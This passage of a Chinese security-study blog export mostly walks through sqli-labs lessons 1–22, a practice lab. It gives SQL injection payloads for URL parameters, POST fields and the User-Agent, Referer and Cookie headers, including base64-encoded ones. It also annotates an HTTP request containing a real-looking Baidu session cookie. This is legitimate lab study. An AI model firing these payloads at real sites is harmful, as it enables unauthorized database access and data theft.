class="built_in">CAST</span>((<span class="type">CHAR</span>(<span class="number">98</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">114</span>)) <span class="keyword">AS</span> VA</span><br><span class="line">RCHAR(<span class="number">8000</span>)), (<span class="type">CHAR</span>(<span class="number">32</span>)))</span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] retrieved: bar</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>:    <span class="string">&#x27;foo, bar&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如你所见，sqlmap 将提供的查询分解为两个不同的 <code>SELECT</code> 语句，然后单独获取每个查询的输出。</p>
<p>如果提供的查询是一个 <code>SELECT</code> 语句并包含一个 <code>FROM</code> 子句，sqlmap 会询问你是否可以返回多个条目。在这种情况下，它知道如何解析返回的结果，逐条计算指定的条目数量，并给出相关输出。</p>
<p>SQL shell 选项允许你以交互方式运行自己的 SQL 语句，就像直接连接到 DBMS 的 SQL 控制台。此功能还提供 TAB 补全和输入历史支持。</p>
</blockquote>
<h2 id="个人剧场"><a href="#个人剧场" class="headerlink" title="个人剧场"></a>个人剧场</h2><p>基本上，使用完整的单词作为命令的，使用<code>--</code></p>
<p>使用单个单词大写字母的，使用<code>-</code></p>
<p><code>--dbs</code>用于搜索数据库，<code>-D</code>则用于指定数据库</p>
<p><code>--tables</code>用于搜索数据表，<code>-T</code>则用于指定数据表</p>
<p><code>--columns</code>用于搜索字段，<code>-C</code>则用于指定字段</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>基础学习</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL-[sqli-labs] 1-22 BasicInjections</title>
    <url>/2021/SQL-%5Bsqli-labs%5D%201-22%20BasicInjections/</url>
    <content><![CDATA[<h1 id="sqli-labs-SQL基础学习过程中的练习记录"><a href="#sqli-labs-SQL基础学习过程中的练习记录" class="headerlink" title="sqli-labs  SQL基础学习过程中的练习记录"></a>sqli-labs  SQL基础学习过程中的练习记录</h1><blockquote>
<p>注入技巧使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注</p>
</blockquote>
<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><h2 id="判断闭合形式"><a href="#判断闭合形式" class="headerlink" title="判断闭合形式"></a>判断闭合形式</h2><p>注入过程中一大关键点是对注入点闭合形式的判断</p>
<p>而这判断，九分就靠猜测</p>
<p>举Less-7为例（刚好做到这题想着整理一下，没有瞧不起其他题的意思）</p>
<p>猜测其闭合形式为((‘’))</p>
<p>访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and 1=1--+</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210320163756043.png"
                      alt="image-20210320163756043"
                ></p>
<p>输出正常</p>
<p>访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and 1=2--+</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210320163831996.png"
                      alt="image-20210320163831996"
                ></p>
<p>页面报错</p>
<p>这就证明了我们的猜测是正确的</p>
<p>如若猜测错误</p>
<p>访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)) and 1=1--+</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210320164051996.png"
                      alt="image-20210320164051996"
                ></p>
<p>页面显示正常</p>
<p>但是，当访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)) and 1=2--+</span><br></pre></td></tr></table></figure>

<p>页面没有发生变化</p>
<p>而正常情况下，由于1=2是错误的，页面应报错或无回显</p>
<h2 id="两个重要系统变量"><a href="#两个重要系统变量" class="headerlink" title="两个重要系统变量"></a>两个重要系统变量</h2><p>@@datadir 读取数据库路径</p>
<p>@@basedir 读取MySQL路径</p>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,@@datadir,@@basedir--+</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210322153208065.png"
                      alt="image-20210322153208065"
                ></p>
<h1 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="①普通联合"><a href="#①普通联合" class="headerlink" title="①普通联合"></a>①普通联合</h3><p>测试注入型</p>
<p>访问id=2与id=3-1回显不同，排除数字型注入</p>
<p>访问id=1a与id=1回显相同，即可判断该注入点为字符型注入</p>
<p>访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>得到与id=1相同回显，确定为字符型注入</p>
<p>将查询语句输入到单引号与注释符之间即可</p>
<p>从”order by 1”开始测试，直到访问到</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;order by 4--+</span></span><br></pre></td></tr></table></figure>

<p>页面出错，即可判断字段数为”3”</p>
<p>访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>

<p>页面回显</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210316201422230.png"
                      alt="image-20210316201422230"
                ></p>
<p>即可在’2’或”3”位置输入查询语句</p>
<p>查询本数据库所有表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span></span><br></pre></td></tr></table></figure>

<p>输出为”emails,referers,uagents,users”</p>
<p>查询”emails”中内容</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;emails&quot;--+</span></span><br></pre></td></tr></table></figure>

<p>输出为”id,email_id”</p>
<p>访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(id,email_id) from emails--+</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210316203905708.png"
                      alt="image-20210316203905708"
                ></p>
<p>查询其他表用类似查询语句即可</p>
<h3 id="②报错注入"><a href="#②报错注入" class="headerlink" title="②报错注入"></a>②报错注入</h3><p>亦可使用报错注入，示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>

<h3 id="③布尔盲注"><a href="#③布尔盲注" class="headerlink" title="③布尔盲注"></a>③布尔盲注</h3><p>布尔盲注，示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,length(database())&gt;=1--+</span></span><br></pre></td></tr></table></figure>

<h3 id="④时间盲注"><a href="#④时间盲注" class="headerlink" title="④时间盲注"></a>④时间盲注</h3><p>时间盲注，示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,if(length(database())&gt;1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>访问id=2与id=3-1回显相同，即为数字型注入</p>
<p>如Less-1使用union联合注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>

<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>同Less-1测试注入型，为字符型注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure>

<p>id闭合使用(‘’)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>同三</p>
<p>闭合方式不同</p>
<p>该题的闭合方式是(“”)</p>
<p>访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>

<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>简单判断注入类型</p>
<p>尝试报错注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210320155657209.png"
                      alt="image-20210320155657209"
                ></p>
<p>将插在中间的查询语句修改为其他查询语句，即可开始查询</p>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>同Less-5</p>
<p>报错注入</p>
<p>闭合方式不同，使用””闭合</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>先找出闭合方式</p>
<p>闭合方式为((‘’))</p>
<p>啥都没显示，选择盲注</p>
<p>布尔盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and length(database())&gt;=1--+</span></span><br></pre></td></tr></table></figure>

<p>时间盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and if(length(database())&gt;1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>

<p>其实，根据题目提示，这题本该使用’outfile’进行相关注入</p>
<p>但经过尝试，出现一些问题，目前没有解决，所以先使用盲注</p>
<p>相比于其他注入</p>
<p>布尔盲注与时间盲注更为麻烦</p>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>寻找闭合，闭合方式为’’</p>
<p>布尔盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;=1--+</span></span><br></pre></td></tr></table></figure>

<p>时间盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>随便输入啥都没有变化</p>
<p>盲猜闭合方式就是普通的’’</p>
<p>由于没报错回显，只能使用时间盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>同Less-9</p>
<p>闭合方式改变，为””</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot; and if(length(database())&gt;1,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<h1 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h1><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><h3 id="①普通联合-1"><a href="#①普通联合-1" class="headerlink" title="①普通联合"></a>①普通联合</h3><p>第十一题开始就为POST型注入</p>
<p>POST与GET其实大同小异</p>
<p>仅是注入的位置发生改变，注入的方法没有改变</p>
<p>这里使用Burp Suite来修改POST值</p>
<p>选择uname作为SQL语句的输入点，passwd可随意输入</p>
<p>首先还是判断闭合方式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;or 1=1--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210323200939603.png"
                      alt="image-20210323200939603"
                ></p>
<p>即闭合方式为’’</p>
<p>判断字段数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;order by 3--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210323200224093.png"
                      alt="image-20210323200224093"
                ></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;order by 2--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p>没有任何回显，即字段数为2</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p>即可在1或2位置插入查询语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210323201320523.png"
                      alt="image-20210323201320523"
                ></p>
<h3 id="②报错注入-1"><a href="#②报错注入-1" class="headerlink" title="②报错注入"></a>②报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210323201544567.png"
                      alt="image-20210323201544567"
                ></p>
<h3 id="③布尔盲注-1"><a href="#③布尔盲注-1" class="headerlink" title="③布尔盲注"></a>③布尔盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,length(database())&gt;=1--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210323201824099.png"
                      alt="image-20210323201824099"
                ></p>
<h3 id="④时间盲注-1"><a href="#④时间盲注-1" class="headerlink" title="④时间盲注"></a>④时间盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210323201720691.png"
                      alt="image-20210323201720691"
                ></p>
<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>相比于上一题，闭合方式发生了改变</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>啥回显都没有，选择时间盲注</p>
<p>较为麻烦的在于判断闭合方式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;)union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>同上，闭合方式””</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span>&quot; union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>同上，闭合方式’’</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>同上，闭合方式(“”)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>报错注入</p>
<p>需提前知道用户名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h1 id="其它花里胡哨"><a href="#其它花里胡哨" class="headerlink" title="其它花里胡哨"></a>其它花里胡哨</h1><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>在User-Agent上输入注入语句</p>
<p>且要保证用户名与密码是正确的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">uname=Dumb&amp;passwd=Dumb&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent:<span class="string">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>注入点：Referer</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Referer: <span class="string">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)and&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>注意，这里在Referer注入时，需将原Referer的内容删除，笔者就是因为最开始没有删除，走了很多弯路</li>
</ul>
<p>错误注入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210329185644513.png"
                      alt="image-20210329185644513"
                ></p>
<p>正确注入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210329185748385.png"
                      alt="image-20210329185748385"
                ></p>
<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>附：找到一个Less-20，21，22讲得很细的<a class="link"   href="https://blog.csdn.net/weixin_39934520/article/details/105525398" >博客<i class="fas fa-external-link-alt"></i></a></p>
<p>注入点：Cookie</p>
<p>与普通的联合注入方法相同</p>
<p>order by 查询字段数</p>
<p>union联合查询即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie:<span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210329202607121.png"
                      alt="image-20210329202607121"
                ></p>
<p>结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210329202741925.png"
                      alt="image-20210329202741925"
                ></p>
<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>任意用户登录后，发现Cookie值与上一题有所不同</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210329203322169.png"
                      alt="image-20210329203322169"
                ></p>
<p>判断该值为base64加密</p>
<p>将查询语句使用base64加密再进行注入</p>
<p>闭合方式：(‘’)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie:<span class="number">-1</span><span class="string">&#x27;)union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>

<p>base64编码后</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie:LTEnKXVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSM<span class="operator">=</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210329204043644.png"
                      alt="image-20210329204043644"
                ></p>
<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>同上</p>
<p>闭合方式””</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie:<span class="number">-1</span>&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>

<p>base64编码后：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie:LTEidW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>练习记录</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL-[sqli-labs] 23-38 AdvInjections</title>
    <url>/2021/SQL-%5Bsqli-labs%5D%2023-38%20AdvInjections/</url>
    <content><![CDATA[<h1 id="sqli-labs-SQL基础学习过程中的练习记录"><a href="#sqli-labs-SQL基础学习过程中的练习记录" class="headerlink" title="sqli-labs  SQL基础学习过程中的练习记录"></a>sqli-labs  SQL基础学习过程中的练习记录</h1><h2 id="Lsee-23"><a href="#Lsee-23" class="headerlink" title="Lsee-23"></a>Lsee-23</h2>]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>练习记录</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试-基础入门</title>
    <url>/2021/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="渗透测试-基础入门"><a href="#渗透测试-基础入门" class="headerlink" title="渗透测试-基础入门"></a>渗透测试-基础入门</h1><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>主要对以下四个方面进行渗透测试，每一个不同的层次都可能会有不同的漏洞产生</p>
<p><img "" class="lazyload placeholder" data-original="/img/image-20210613144242729.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210613144242729"></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>网站源码：脚本类型、应用方向</p>
<p>操作系统：Windows Linux</p>
<p>中间件（搭建平台）：apache iis tomcat nginx等等</p>
<p>数据库：MySQL access Oracle Sybase db2等等</p>
<p>每一个组成都可能出现漏洞</p>
<h2 id="Resquest请求数据包数据格式"><a href="#Resquest请求数据包数据格式" class="headerlink" title="Resquest请求数据包数据格式"></a>Resquest请求数据包数据格式</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"># 请求行 请求类型“GET” 地址空“/” HTTP版本“HTTP1.1”</span><br><span class="line"># 以下全为请求头</span><br><span class="line">Host: www.baidu.com</span><br><span class="line"># 主机或域名地址</span><br><span class="line">Connection: keep-alive</span><br><span class="line"># 是否可维持固定的HTTP连接</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;, &quot;Google Chrome&quot;;v=&quot;90&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line"># 客户浏览器相关信息</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"># 浏览器或其它客户可接受的MIME文件格式</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"># 可接受的编码方式</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"># 语言</span><br><span class="line">Cookie: BIDUPSID=DA4D6082C628135DDA37ABCD1C6D3332; PSTM=1620553468; BD_UPN=12314753; __yjs_duid=1_84455bacdd75b372174be64fdc5cfbc31620570385818; sug=3; ORIGIN=0; bdime=0; BAIDUID=DA4D6082C628135DA028BE4F634B8E1A:SL=0:NR=10:FG=1; sugstore=0; H_PS_PSSID=31253_33848_33773_33607_26350_22159; H_PS_645EC=0486TPt60FaSP2w72uFciN7pMi7zUhUX9Q5kKwZt%2FB1cMDIiObRqF4aEh6o; delPer=0; BD_CK_SAM=1; PSINO=3; ab_sr=1.0.0_ZDk4NmM5MjhiNGQ0YWJlMTZkY2I3YzlhZjVlMGRjODk0NmQzNGJkZmM0ZjZiZTRjZTdmNTZlZDFmMWMyYzhjMGM3Nzc5ZjM4MzQ3YmU4NWY2YzhjNDdlZjdlOGYwZDNl; BD_HOME=1; BA_HECTOR=0la1258l2h25a02g1t1gbpki70q</span><br><span class="line"># Cookie信息</span><br></pre></td></tr></table></figure>

<p>（百度首页地址Request Headers）</p>
<h3 id="1-请求行"><a href="#1-请求行" class="headerlink" title="1.请求行"></a>1.请求行</h3><p>请求类型/请求资源路径、协议的版本和类型</p>
<p>请求行由三个标记组成：请求方法、请求URL和HTTP的版本</p>
<p>例如：GET /index.html HTTP/1.1    其中，“GET”为请求方法，“/index.html”为请求URL，“HTTP/1.1”为HTTP版本</p>
<h4 id="HTTP规定八种可能的请求方法"><a href="#HTTP规定八种可能的请求方法" class="headerlink" title="HTTP规定八种可能的请求方法"></a>HTTP规定八种可能的请求方法</h4><ul>
<li>GET：检索URL中标志资源的一个简单请求</li>
